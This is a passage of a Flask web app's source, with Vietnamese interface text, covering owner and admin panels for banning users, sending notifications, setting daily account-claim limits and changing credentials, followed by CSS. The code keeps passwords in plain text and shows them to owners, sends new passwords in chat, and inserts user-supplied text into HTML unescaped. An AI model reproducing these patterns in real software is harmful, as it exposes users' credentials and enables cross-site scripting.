        save_data(force=True)
    return redirect(url_for("admin_panel", tab="users"))

@app.route("/admin/ban/<username>")
@owner_required
def admin_ban(username):
    if username == OWNER_USERNAME: flash("Không ban Owner!", "error")
    else:
        BANNED_USERS.add(username); log_admin("BAN", username); save_data(force=True)
        flash(f"Đã ban {username}", "success")
    return redirect(url_for("admin_panel", tab="users"))

@app.route("/admin/unban/<username>")
@owner_required
def admin_unban(username):
    BANNED_USERS.discard(username); log_admin("UNBAN", username); save_data(force=True)
    flash(f"Đã unban {username}", "success")
    return redirect(url_for("admin_panel", tab="users"))

@app.route("/admin/send_notification", methods=["POST"])
@admin_or_qtv_required
def admin_send_notification():
    t_ = request.form.get("title", "").strip(); c = request.form.get("content", "").strip()
    if not t_ or not c: flash("Nhập đầy đủ!", "error"); return redirect(url_for("admin_panel", tab="notif"))
    NOTIFICATIONS.append({"id": uuid.uuid4().hex[:10], "title": t_, "content": c,
                          "admin": session["username"],
                          "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "timestamp": time.time()})
    if len(NOTIFICATIONS) > 200: NOTIFICATIONS.pop(0)
    log_admin("SEND_NOTIF", t_); save_data(force=True)
    flash(f"Đã gửi: {t_}", "success")
    return redirect(url_for("admin_panel", tab="notif"))

@app.route("/notifications")
@login_required
def notifications():
    user = get_user(); mark_read()
    items = ""
    for n in reversed(NOTIFICATIONS):
        items += f'<div class="card"><div style="font-weight:700;">{n["title"]}</div><div style="font-size:0.72em; color:var(--text-mute);">{n["time"]} · {n["admin"]}</div><div style="white-space:pre-wrap; margin-top:8px;">{n["content"]}</div></div>'
    if not items: items = '<div class="card"><p style="text-align:center;">Chưa có thông báo</p></div>'
    return render_page(f'<div class="card"><h2 class="card-title">◉ Thông Báo</h2></div>{items}', active_tab="notif", user=user)

# ========== OWNER PANEL ==========
@app.route("/owner")
@owner_required
def owner_panel(): return redirect(url_for("owner_users"))

@app.route("/owner/users")
@owner_required
def owner_users():
    user = get_user()
    keyword = request.args.get("q", "").strip().lower()
    all_users = list(USERS.values())
    if keyword:
        all_users = [u for u in all_users if keyword in u.get("username", "").lower()
                     or keyword in u.get("id", "").lower() or keyword in u.get("tag_code", "").lower()
                     or keyword in u.get("nickname", "").lower()]
    rows = ""
    for u in all_users:
        un = u.get("username", ""); pw = u.get("plain_password", "")
        pw_d = f'<span style="color:#00ff88; font-family:monospace;">{pw}</span>' if pw else '[hash]'
        role, role_color = "👤 USER", "#8b8b9a"
        if u.get("is_owner"): role, role_color = "🥇 OWNER", "#ffb800"
        elif u.get("is_qtv"): role, role_color = "👑 QTV", "#00f0ff"
        ban_mark = " 🚫" if un in BANNED_USERS else ""
        dl = u.get("daily_limit", USER_DAILY_LIMIT)
        dl_disp = "∞" if dl == -1 else str(dl)
        rows += f'''<div class="list-item" style="flex-wrap:wrap;">
            <div style="flex:1; min-width:180px;">
                <div><span style="color:{role_color}; font-weight:800; font-size:0.8em;">{role}</span> <span style="font-family:monospace; font-weight:700;">{un}</span>{ban_mark}</div>
                <div style="font-size:0.72em; color:var(--text-mute);">ID: {u.get("id","?")} · Lv{u.get("level",1)} · 🎯 {dl_disp}/ngày · 🏷️ {u.get("tag_code","")}</div>
                <div style="font-size:0.8em; margin-top:4px;">🔑 {pw_d}</div>
            </div>
            <div style="display:flex; gap:4px; flex-wrap:wrap;">
                <a href="/owner/view_user/{un}" class="btn btn-sm btn-info">👁</a>
                <a href="/owner/set_limit/{un}" class="btn btn-sm btn-success">🎯</a>
                <a href="/owner/add_limit/{un}" class="btn btn-sm" style="background:linear-gradient(135deg,#a855f7,#7c3aed); color:#fff;">➕</a>
                <a href="/owner/change_creds/{un}" class="btn btn-sm btn-warning">🔑</a>
            </div></div>'''
    if not rows: rows = '<p style="text-align:center; color:var(--text-dim);">Không có user</p>'
    content = f'''<div class="card">
        <h2 class="card-title" style="color:#ffb800;">🥇 QUẢN LÝ USER</h2>
        <form method="GET" style="margin-bottom:14px;"><div style="display:flex; gap:8px;">
            <input type="text" name="q" class="form-input" placeholder="🔍 Tìm..." value="{keyword}">
            <button type="submit" class="btn">🔍</button>
            {"<a href='/owner/users' class='btn btn-secondary'>✕</a>" if keyword else ""}</div></form>
        <div class="stat-grid-3">
            <div class="stat-box"><div class="stat-value">{len(USERS)}</div><div class="stat-label">User</div></div>
            <div class="stat-box"><div class="stat-value">{sum(1 for u in USERS.values() if u.get("is_qtv"))}</div><div class="stat-label">QTV</div></div>
            <div class="stat-box"><div class="stat-value">{len(BANNED_USERS)}</div><div class="stat-label">Banned</div></div>
        </div>
        <div style="display:flex; gap:8px; margin-top:14px;">
            <a href="/owner/admins" class="btn btn-info btn-block" style="flex:1;">👑 QTV</a>
        </div>
    </div>
    <div class="card"><h3 class="card-title">📋 Danh sách ({len(all_users)})</h3>{rows}</div>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/admins")
@owner_required
def owner_admins():
    user = get_user()
    sp = [u for u in USERS.values() if u.get("is_qtv") or u.get("is_owner")]
    rows = ""
    for u in sp:
        un = u.get("username", ""); iow = u.get("is_owner", False); iq = u.get("is_qtv", False)
        dis = "disabled" if un == OWNER_USERNAME else ""
        role = "🥇 OWNER" if iow else "👑 QTV"
        pw = u.get("plain_password", "")
        rows += f'''<div class="card" style="padding:14px;">
            <div style="display:flex; justify-content:space-between; flex-wrap:wrap; gap:8px;">
                <div><div style="font-family:Orbitron; font-weight:800; color:#ffb800;">{role}</div>
                    <div style="font-family:monospace; font-size:1.05em; margin:4px 0;">{un}</div>
                    <div style="font-size:0.8em;">🔑 <span style="color:#00ff88; font-family:monospace;">{pw}</span></div></div>
                <div style="display:flex; flex-direction:column; gap:6px; min-width:180px;">
                    <label style="display:flex; align-items:center; gap:6px; font-size:0.82em;">
                        <input type="checkbox" {"checked" if iq else ""} {dis} onchange="setRole('{un}','is_qtv',this.checked)"> QTV</label>
                    <label style="display:flex; align-items:center; gap:6px; font-size:0.82em;">
                        <input type="checkbox" {"checked" if iow else ""} {dis} onchange="setRole('{un}','is_owner',this.checked)"> Owner</label>
                    <a href="/owner/change_creds/{un}" class="btn btn-sm btn-warning">🔑 Đổi TK/MK</a>
                </div></div></div>'''
    if not rows: rows = '<p style="text-align:center; color:var(--text-dim);">Chưa có QTV</p>'
    content = f'''<div class="card">
        <a href="/owner/users" class="btn btn-secondary btn-sm" style="margin-bottom:12px;">← User</a>
        <h2 class="card-title" style="color:#ffb800;">🥇 QUẢN LÝ QTV / OWNER</h2>
    </div>{rows}
    <script>
    function setRole(u, f, v) {{
        fetch("/owner/set_role", {{ method:"POST", headers:{{"Content-Type":"application/json"}},
            body: JSON.stringify({{username:u, field:f, value:v}}) }})
        .then(r => r.json()).then(d => {{ if (d.error) {{ alert(d.error); location.reload(); }}
            else showToast("✓ Đã cập nhật " + f); }});
    }}
    </script>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/set_role", methods=["POST"])
@owner_required
def owner_set_role():
    data = request.get_json(silent=True) or {}
    un = data.get("username", ""); f = data.get("field", ""); v = bool(data.get("value", False))
    if f not in ("is_qtv", "is_owner"): return jsonify({"error": "Field sai"})
    if un not in USERS: return jsonify({"error": "User không tồn tại"})
    if un == OWNER_USERNAME and f == "is_owner" and not v:
        return jsonify({"error": "Không thể tự hạ Owner!"})
    old = USERS[un].get(f, False); USERS[un][f] = v
    invalidate_user_sessions(un); log_admin("SET_ROLE", un, f"{f}: {old}→{v}")
    save_data(force=True); return jsonify({"ok": True})

@app.route("/owner/set_limit/<username>", methods=["GET", "POST"])
@owner_required
def owner_set_limit(username):
    user = get_user()
    if username not in USERS: flash("User không tồn tại!", "error"); return redirect(url_for("owner_users"))
    t_ = USERS[username]
    if request.method == "POST":
        try: new_limit = int(request.form.get("limit", USER_DAILY_LIMIT))
        except: flash("Số không hợp lệ!", "error"); return redirect(url_for("owner_set_limit", username=username))
        if new_limit < -1: flash("Limit tối thiểu = -1", "error"); return redirect(url_for("owner_set_limit", username=username))
        t_["daily_limit"] = new_limit; log_admin("SET_LIMIT", username, f"limit={new_limit}"); save_data(force=True)
        limit_txt = "∞ UNLIMITED" if new_limit == -1 else f"{new_limit} lượt/ngày"
        notify = f"🔔 LƯỢT NHẬN ACC ĐÃ CẬP NHẬT\n└─ Bạn có: {limit_txt}"
        add_chat_message(f"support:{username}", "SYSTEM", notify)
        threading.Thread(target=save_chat, daemon=True).start()
        flash(f"✅ Đã set {limit_txt}", "success")
        return redirect(url_for("owner_users"))
    current = t_.get("daily_limit", USER_DAILY_LIMIT)
    current_txt = "∞ UNLIMITED" if current == -1 else f"{current} lượt/ngày"
    content = f'''<div class="card">
        <div style="display:flex; justify-content:space-between; margin-bottom:14px;">
            <a href="/owner/users" class="btn btn-secondary btn-sm">← Quay lại</a>
            <h2 class="card-title" style="margin:0;">🎯 SET LƯỢT NHẬN ACC</h2></div>
        <div class="info-row"><span class="info-label">User</span><span class="info-value" style="font-family:monospace;">{username}</span></div>
        <div class="info-row"><span class="info-label">Limit hiện tại</span><span class="info-value" style="color:#ffb800; font-weight:800;">{current_txt}</span></div>
    </div>
    <div class="card"><h3 class="card-title">🔧 Chọn Limit Mới</h3>
        <form method="POST">
            <div class="form-group"><label class="form-label">Số lượt/ngày</label>
                <input type="number" name="limit" class="form-input" value="{current}" min="-1" required></div>
            <div style="display:flex; gap:8px; margin-bottom:14px; flex-wrap:wrap;">
                <button type="submit" name="limit" value="{USER_DAILY_LIMIT}" class="btn btn-secondary btn-sm">{USER_DAILY_LIMIT} (Mặc định)</button>
                <button type="submit" name="limit" value="50" class="btn btn-info btn-sm">50 (VIP)</button>
                <button type="submit" name="limit" value="999" class="btn btn-warning btn-sm">999 (Siêu VIP)</button>
                <button type="submit" name="limit" value="-1" class="btn btn-success btn-sm">∞ Unlimited</button></div>
            <button type="submit" class="btn btn-block">✅ Xác Nhận</button></form></div>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/add_limit/<username>", methods=["GET", "POST"])
@owner_required
def owner_add_limit(username):
    user = get_user()
    if username not in USERS: flash("User không tồn tại!", "error"); return redirect(url_for("owner_users"))
    t_ = USERS[username]
    if request.method == "POST":
        try: amt = int(request.form.get("amount", 0))
        except: flash("Số không hợp lệ!", "error"); return redirect(url_for("owner_add_limit", username=username))
        current = t_.get("daily_limit", USER_DAILY_LIMIT)
        new_limit = current + amt
        if new_limit < -1: new_limit = -1
        t_["daily_limit"] = new_limit; log_admin("ADD_LIMIT", username, f"{current}→{new_limit}"); save_data(force=True)
        limit_txt = "∞ UNLIMITED" if new_limit == -1 else f"{new_limit} lượt/ngày"
        notify = f"🎁 LƯỢT NHẬN ACC ĐÃ CẬP NHẬT\n└─ Hiện tại: {limit_txt}"
        add_chat_message(f"support:{username}", "SYSTEM", notify)
        threading.Thread(target=save_chat, daemon=True).start()
        flash(f"✅ Đã {amt:+d} lượt cho {username}. Limit mới: {limit_txt}", "success")
        return redirect(url_for("owner_users"))
    current = t_.get("daily_limit", USER_DAILY_LIMIT)
    current_txt = "∞ UNLIMITED" if current == -1 else f"{current} lượt/ngày"
    content = f'''<div class="card">
        <div style="display:flex; justify-content:space-between; margin-bottom:14px;">
            <a href="/owner/users" class="btn btn-secondary btn-sm">← Quay lại</a>
            <h2 class="card-title" style="margin:0;">🎁 CỘNG LƯỢT</h2></div>
        <div class="info-row"><span class="info-label">User</span><span class="info-value" style="font-family:monospace;">{username}</span></div>
        <div class="info-row"><span class="info-label">Limit hiện tại</span><span class="info-value" style="color:#ffb800; font-weight:800;">{current_txt}</span></div>
    </div>
    <div class="card"><h3 class="card-title">➕ Cộng lượt nhanh</h3>
        <form method="POST">
            <div class="form-group"><label class="form-label">Số lượt cộng (+/-)</label>
                <input type="number" name="amount" class="form-input" value="10" required></div>
            <div style="display:flex; gap:8px; margin-bottom:14px; flex-wrap:wrap;">
                <button type="submit" name="amount" value="10" class="btn btn-success btn-sm">+10</button>
                <button type="submit" name="amount" value="50" class="btn btn-info btn-sm">+50</button>
                <button type="submit" name="amount" value="100" class="btn btn-warning btn-sm">+100</button>
                <button type="submit" name="amount" value="999" class="btn btn-danger btn-sm">+999</button></div>
            <button type="submit" class="btn btn-block">✅ Xác Nhận</button></form></div>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/change_creds/<username>", methods=["GET", "POST"])
@owner_required
def owner_change_creds(username):
    user = get_user()
    if username not in USERS: flash("User không tồn tại!", "error"); return redirect(url_for("owner_users"))
    t_ = USERS[username]
    if request.method == "POST":
        nu = request.form.get("new_username", "").strip()
        np_ = request.form.get("new_password", "").strip()
        changed = False
        if nu and nu != username:
            if nu in USERS: flash("Username mới tồn tại!", "error"); return redirect(url_for("owner_change_creds", username=username))
            t_["username"] = nu; USERS[nu] = USERS.pop(username)
            invalidate_user_sessions(nu); username = nu; changed = True
            flash(f"✅ Đổi username → {nu}", "success")
        if np_:
            t_["password"] = hash_password(np_); t_["plain_password"] = np_
            invalidate_user_sessions(t_.get("username", username)); changed = True
            flash("✅ Đổi password thành công", "success")
        if changed:
            t_["force_logout_reason"] = "Admin đã đổi thông tin. Vui lòng đăng nhập lại!"
            log_admin("CHANGE_CREDS", username, "OK"); save_data(force=True)
            notify = (f"🔔 TÀI KHOẢN ĐÃ CẬP NHẬT\n├─ User: {username}\n"
                      f"├─ MK mới: {np_ if np_ else '(giữ nguyên)'}\n└─ Vui lòng đăng nhập lại!")
            add_chat_message(f"support:{username}", "SYSTEM", notify)
            threading.Thread(target=save_chat, daemon=True).start()
        return redirect(url_for("owner_users"))
    pw = t_.get("plain_password", "")
    content = f'''<div class="card">
        <div style="display:flex; justify-content:space-between; margin-bottom:14px;">
            <a href="/owner/admins" class="btn btn-secondary btn-sm">← Quay lại</a>
            <h2 class="card-title" style="margin:0;">🔑 ĐỔI TK/MK</h2></div>
        <div class="info-row"><span class="info-label">User</span><span class="info-value" style="font-family:monospace;">{username}</span></div>
        <div class="info-row"><span class="info-label">MK hiện tại</span><span class="info-value" style="color:#00ff88; font-family:monospace;">{pw or "[hash]"}</span></div>
    </div>
    <div class="card"><h3 class="card-title" style="color:#00ff88;">🔓 Đổi TRỰC TIẾP (KHÔNG cần OTP)</h3>
        <form method="POST">
            <div class="form-group"><label class="form-label">Username mới (bỏ trống nếu không đổi)</label>
                <input type="text" name="new_username" class="form-input" placeholder="{username}"></div>
            <div class="form-group"><label class="form-label">Password mới (bỏ trống nếu không đổi)</label>
                <input type="text" name="new_password" class="form-input" placeholder="MK mới"></div>
            <button type="submit" class="btn btn-success btn-block">🔐 ĐỔI NGAY</button></form></div>
    <div class="card" style="border:1px solid #ff8800;">
        <p style="color:#ff8800; font-size:0.85em;">⚠️ User <b>{username}</b> đang online sẽ bị văng ngay.</p></div>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/view_user/<username>")
@owner_required
def owner_view_user(username):
    user = get_user()
    if username not in USERS: flash("User không tồn tại!", "error"); return redirect(url_for("owner_users"))
    u = USERS[username]
    pw = u.get("plain_password", "")
    pw_html = f'<span style="color:#00ff88; font-family:monospace; font-size:1.2em;">{pw}</span>' if pw else '<span style="color:#ff8800;">[Không lưu]</span>'
    role = "👤 USER"
    if u.get("is_owner"): role = "🥇 OWNER"
    elif u.get("is_qtv"): role = "👑 QTV"
    dl = u.get("daily_limit", USER_DAILY_LIMIT)
    dl_disp = "∞" if dl == -1 else str(dl)
    badges_count = len(u.get("badges", []))
    content = f'''<div class="card">
        <div style="display:flex; justify-content:space-between; margin-bottom:14px;">
            <a href="/owner/users" class="btn btn-secondary btn-sm">← Quay lại</a>
            <h2 class="card-title" style="margin:0;">👁 CHI TIẾT USER</h2></div>
        <div class="info-row"><span class="info-label">Role</span><span class="info-value">{role}</span></div>
        <div class="info-row"><span class="info-label">Username</span><span class="info-value" style="font-family:monospace;">{username}</span></div>
        <div class="info-row"><span class="info-label">Password</span><span class="info-value">{pw_html}</span></div>
        <div class="info-row"><span class="info-label">🏷️ Tag</span><span class="info-value" style="font-family:monospace;">{u.get("tag_code","")}</span></div>
        <div class="info-row"><span class="info-label">ID</span><span class="info-value" style="font-family:monospace;">{u.get("id","")}</span></div>
        <div class="info-row"><span class="info-label">Balance</span><span class="info-value">{u.get("balance",0)} xu</span></div>
        <div class="info-row"><span class="info-label">🎯 Lượt nhận</span><span class="info-value" style="color:#00ff88; font-weight:800;">{dl_disp}/ngày</span></div>
        <div class="info-row"><span class="info-label">Level</span><span class="info-value">Lv{u.get("level",1)}</span></div>
        <div class="info-row"><span class="info-label">🏅 Huy hiệu</span><span class="info-value">{badges_count}/{len(BADGE_DEFS)}</span></div>
        <div class="info-row"><span class="info-label">Ngôn ngữ</span><span class="info-value">{TRANSLATIONS.get(u.get("lang","vi"),{}).get("lang_flag","??")} {u.get("lang","vi").upper()}</span></div>
        <div class="info-row"><span class="info-label">Nền</span><span class="info-value">{THEMES.get(u.get("background","grid"),{}).get("name_vi","?")}</span></div>
        <div class="info-row"><span class="info-label">Màu chủ đạo</span><span class="info-value">{ACCENT_COLORS.get(u.get("accent","cyan"),{}).get("name_vi","?")}</span></div>
        <div class="info-row"><span class="info-label">Banned</span><span class="info-value">{"🚫 CÓ" if username in BANNED_USERS else "✅ Không"}</span></div>
    </div>'''
    return render_page(content, active_tab="", user=user)

# ============================================================
# ========== BASE CSS + JS ===================================
# ============================================================
BASE_CSS = """<style>
@import url('https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700;800&family=Be+Vietnam+Pro:wght@400;500;600;700;800;900&family=Share+Tech+Mono&display=swap');
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
:root{
  --bg-deep:#050811;--bg-surface:#0a101f;--bg-card:rgba(13,22,42,0.75);--bg-card-hover:rgba(19,32,60,0.88);
  --border-card:rgba(0,242,254,0.14);--border-glow:rgba(0,242,254,0.45);
  --cyan-neon:#00f2fe;--cyan-glow:rgba(0,242,254,0.45);
  --gold-sss:#ffb703;--gold-glow:rgba(255,183,3,0.55);
  --pink-anime:#ff007f;--pink-glow:rgba(255,0,127,0.55);
  --blue-ss:#00c6ff;--blue-glow:rgba(0,198,255,0.45);
  --green-safe:#10b981;--green-glow:rgba(16,185,129,0.4);
  --red-ban:#ef4444;--red-glow:rgba(239,68,68,0.45);
  --text:#f1f5f9;--text-dim:#94a3b8;--text-mute:#64748b;--text-warn:#ffb800;
  --font-display:'Chakra Petch','Be Vietnam Pro',sans-serif;
  --font-body:'Be Vietnam Pro',-apple-system,sans-serif;
  --font-mono:'Share Tech Mono',monospace;
}
html,body{font-family:var(--font-body);background:var(--bg-deep);color:var(--text);min-height:100vh;overflow-x:hidden;}
body{background-image:radial-gradient(circle at 50% -10%,rgba(0,242,254,0.15) 0%,transparent 50%),radial-gradient(circle at 10% 30%,rgba(255,0,127,0.08) 0%,transparent 45%),radial-gradient(circle at 90% 70%,rgba(255,183,3,0.08) 0%,transparent 50%);background-attachment:fixed;padding-bottom:60px;}
.cyber-grid{position:fixed;inset:0;background-size:40px 40px;background-image:linear-gradient(to right,rgba(255,255,255,0.02) 1px,transparent 1px),linear-gradient(to bottom,rgba(255,255,255,0.02) 1px,transparent 1px);pointer-events:none;z-index:0;}
.container{max-width:1320px;margin:0 auto;padding:0 16px;position:relative;z-index:1;}
.app-header{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:linear-gradient(135deg,rgba(16,26,52,0.92),rgba(9,16,32,0.98));border:1px solid var(--border-card);border-radius:20px;margin-bottom:14px;position:sticky;top:10px;z-index:100;box-shadow:0 8px 40px rgba(0,242,254,0.15);backdrop-filter:blur(24px);gap:12px;}
.app-logo{display:flex;align-items:center;gap:10px;}
.app-logo-icon{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,#00f2fe 0%,#4facfe 50%,#6b21a8 100%);display:flex;align-items:center;justify-content:center;font-size:20px;color:#fff;box-shadow:0 0 20px rgba(0,242,254,0.45);border:1px solid rgba(255,255,255,0.3);transform:rotate(-3deg);flex-shrink:0;}
.app-logo-text{font-family:var(--font-display);font-size:1.1em;font-weight:800;letter-spacing:1.5px;background:linear-gradient(135deg,#ffffff 30%,#38bdf8 70%,#818cf8 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-transform:uppercase;}
.balance-pill{display:flex;align-items:center;gap:6px;padding:8px 14px;background:rgba(15,23,42,0.8);border:1px solid rgba(0,242,254,0.3);border-radius:20px;font-weight:800;font-size:0.9em;color:#38bdf8;font-family:var(--font-display);}
.icon-btn{width:38px;height:38px;display:flex;align-items:center;justify-content:center;background:rgba(15,23,42,0.8);border:1px solid rgba(0,242,254,0.2);border-radius:12px;color:#38bdf8;text-decoration:none;font-size:1.1em;transition:all 0.3s;}
.icon-btn:hover{background:rgba(0,242,254,0.15);border-color:var(--cyan-neon);}
.lang-btn{padding:6px 10px;font-family:var(--font-display);font-weight:700;font-size:0.78em;background:rgba(15,23,42,0.8);border:1px solid rgba(0,242,254,0.2);border-radius:10px;color:#38bdf8;text-decoration:none;}
.lang-btn.active{background:linear-gradient(135deg,#00f2fe,#4facfe);color:#000;border-color:transparent;}
.menu-portal{max-width:720px;margin:0 auto 14px auto;position:relative;}
.menu-card{background:linear-gradient(180deg,rgba(16,26,52,0.92) 0%,rgba(9,16,32,0.98) 100%);border:1px solid var(--border-card);border-radius:24px;padding:26px 22px 20px 22px;backdrop-filter:blur(24px);box-shadow:0 20px 50px rgba(0,0,0,0.75),0 0 30px rgba(0,242,254,0.1);position:relative;overflow:hidden;}
.menu-card::before{content:'';position:absolute;top:0;left:10%;right:10%;height:2px;background:linear-gradient(90deg,transparent,#00f2fe,#ff007f,transparent);box-shadow:0 0 15px #00f2fe;}
.menu-header{text-align:center;margin-bottom:22px;position:relative;}
.menu-crest{width:58px;height:58px;margin:0 auto 12px;background:linear-gradient(135deg,rgba(0,242,254,0.2) 0%,rgba(255,0,127,0.2) 100%);border:1px solid rgba(0,242,254,0.4);border-radius:18px;display:flex;align-items:center;justify-content:center;font-size:26px;color:var(--cyan-neon);box-shadow:0 0 25px rgba(0,242,254,0.3);position:relative;}
.menu-crest::after{content:'';position:absolute;inset:-4px;border-radius:22px;border:1px dashed rgba(0,242,254,0.3);animation:spin 20s linear infinite;}
.menu-title{font-family:var(--font-display);font-size:18px;font-weight:800;letter-spacing:1.2px;background:linear-gradient(135deg,#ffffff 40%,#7dd3fc 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-transform:uppercase;margin-bottom:4px;}
.pulse-dot{width:7px;height:7px;background:#10b981;border-radius:50%;display:inline-block;box-shadow:0 0 8px #10b981;animation:pulse 2s infinite;}
.menu-grid-new{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
.menu-btn{text-decoration:none;background:linear-gradient(135deg,rgba(15,23,42,0.7),rgba(0,242,254,0.03));border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px 10px 14px 10px;text-align:center;color:var(--text);display:flex;flex-direction:column;align-items:center;gap:8px;position:relative;transition:all 0.35s;cursor:pointer;}
.menu-btn:hover,.menu-btn.active{transform:translateY(-4px);border-color:var(--cyan-neon);background:linear-gradient(135deg,rgba(0,242,254,0.18) 0%,rgba(14,165,233,0.25) 100%);box-shadow:0 12px 35px rgba(0,242,254,0.4);}
.menu-icon{font-size:1.8em;filter:drop-shadow(0 0 12px rgba(0,242,254,0.6));color:var(--cyan-neon);line-height:1;transition:transform 0.3s;}
.menu-btn:hover .menu-icon,.menu-btn.active .menu-icon{transform:scale(1.15);}
.menu-label{font-family:var(--font-display);font-size:0.78em;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--text-dim);}
.menu-btn.active .menu-label,.menu-btn:hover .menu-label{color:#fff;}
.menu-badge{position:absolute;top:8px;right:8px;background:linear-gradient(135deg,#ff007f,#ff0066);color:#fff;font-size:0.6em;padding:2px 7px;border-radius:8px;font-weight:800;min-width:18px;box-shadow:0 0 10px rgba(255,0,127,0.7);}
.menu-badge-pro{position:absolute;top:8px;right:8px;background:linear-gradient(135deg,#ff007f,#ff5500);color:#fff;font-size:0.55em;font-weight:800;padding:2px 6px;border-radius:6px;}
.card{background:linear-gradient(135deg,rgba(13,22,42,0.75),rgba(10,16,32,0.75));backdrop-filter:blur(24px);border:1px solid var(--border-card);border-radius:20px;padding:20px;margin-bottom:14px;position:relative;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,0.4);}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--cyan-neon),var(--pink-anime),transparent);opacity:0.8;box-shadow:0 0 15px var(--cyan-neon);}
.card-title{font-family:var(--font-display);font-size:1.1em;font-weight:700;letter-spacing:1px;margin-bottom:16px;display:flex;align-items:center;gap:10px;color:#fff;text-transform:uppercase;}
.card-title i{color:var(--accent, #00f2fe);}
.form-group{margin-bottom:16px;}
.form-label{display:block;font-size:0.75em;color:var(--text-dim);margin-bottom:8px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;font-family:var(--font-display);}
.form-input,.form-textarea{width:100%;padding:14px 16px;background:rgba(5,8,17,0.85);border:1.5px solid rgba(255,255,255,0.12);border-radius:12px;color:var(--text);font-size:0.95em;font-family:inherit;transition:all 0.3s;outline:none;}
.form-input:focus,.form-textarea:focus{border-color:var(--accent, #00f2fe);background:rgba(10,17,36,0.95);box-shadow:0 0 0 3px rgba(0,242,254,0.15);}
.form-textarea{min-height:100px;resize:vertical;font-family:'Share Tech Mono',monospace;}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:14px 24px;background:linear-gradient(135deg,var(--accent, #00f2fe),#4facfe);color:#030712;border:none;border-radius:12px;font-weight:800;font-size:0.9em;cursor:pointer;text-decoration:none;font-family:var(--font-display);letter-spacing:1.5px;text-transform:uppercase;transition:all 0.3s;box-shadow:0 6px 25px rgba(0,242,254,0.4);}
.btn:hover{transform:translateY(-3px);box-shadow:0 12px 35px rgba(0,242,254,0.6);filter:brightness(1.08);}
.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none;}
.btn-block{display:flex;width:100%;}
.btn-secondary{background:linear-gradient(135deg,rgba(255,255,255,0.08),rgba(255,255,255,0.04));border:1.5px solid rgba(0,242,254,0.2);color:var(--text);box-shadow:none;}
.btn-success{background:linear-gradient(135deg,#00ff88,#00d4aa);box-shadow:0 6px 25px rgba(0,255,136,0.5);color:#000;}
.btn-warning{background:linear-gradient(135deg,#ffb800,#ff8800);color:#000;}
.btn-danger{background:linear-gradient(135deg,#ff2951,#d50000);color:#fff;}
.btn-info{background:linear-gradient(135deg,#00f2fe,#00a5ff);color:#000;}
.btn-sm{padding:8px 16px;font-size:0.72em;width:auto;}
.stat-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;}
.stat-grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
.stat-grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;}
.stat-box{background:linear-gradient(135deg,rgba(13,22,42,0.7),rgba(0,242,254,0.02));border:1px solid rgba(0,242,254,0.15);border-radius:16px;padding:16px;text-align:center;transition:all 0.3s;}
.stat-box:hover{border-color:var(--accent, #00f2fe);}
.stat-value{font-family:var(--font-display);font-size:1.9em;font-weight:800;background:linear-gradient(135deg,var(--accent, #00f2fe),#38bdf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1.1;margin-bottom:6px;}
.stat-label{font-size:0.65em;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:700;font-family:var(--font-display);}
.stat-box.small{padding:10px 6px;}
.stat-box.small .stat-value{font-size:1.4em;margin-bottom:2px;}
.stat-box.small .stat-label{font-size:0.52em;}
.flash{padding:14px 16px;border-radius:12px;margin-bottom:12px;font-weight:600;font-size:0.9em;display:flex;align-items:center;gap:10px;}
.flash.error{background:rgba(255,0,60,0.15);border:1px solid rgba(255,0,60,0.5);color:#ff88aa;}
.flash.success{background:rgba(0,255,136,0.15);border:1px solid rgba(0,255,136,0.5);color:#88ffcc;}
.result-box{background:rgba(5,8,17,0.9);border:1px solid rgba(0,242,254,0.2);border-radius:14px;padding:16px;font-family:var(--font-mono);font-size:0.78em;line-height:1.7;color:#c0c0e0;white-space:pre-wrap;word-break:break-word;max-height:500px;overflow-y:auto;}
.info-row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(0,242,254,0.08);font-size:0.9em;gap:8px;}
.info-row:last-child{border-bottom:none;}
.info-label{color:var(--text-dim);font-weight:600;font-size:0.9em;flex-shrink:0;}
.info-value{color:var(--text);font-weight:700;text-align:right;word-break:break-all;}
.list-item{background:linear-gradient(135deg,rgba(13,22,42,0.6),rgba(0,242,254,0.02));border:1px solid rgba(0,242,254,0.15);border-radius:14px;padding:14px 16px;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;gap:12px;text-decoration:none;color:var(--text);transition:all 0.3s;}
.list-item:hover{border-color:var(--accent, #00f2fe);transform:translateX(5px);}
.tab-bar{display:flex;gap:8px;overflow-x:auto;margin-bottom:16px;padding-bottom:4px;scrollbar-width:none;}
.tab-bar::-webkit-scrollbar{display:none;}
.tab-item{flex-shrink:0;padding:10px 14px;background:rgba(255,255,255,0.03);border:1px solid rgba(0,242,254,0.15);border-radius:14px;color:var(--text-dim);text-decoration:none;font-weight:700;font-size:0.75em;white-space:nowrap;transition:all 0.3s;font-family:var(--font-display);letter-spacing:1px;}
.tab-item.active{background:linear-gradient(135deg,rgba(0,242,254,0.2),rgba(56,189,248,0.2));border-color:var(--accent, #00f2fe);color:#fff;}
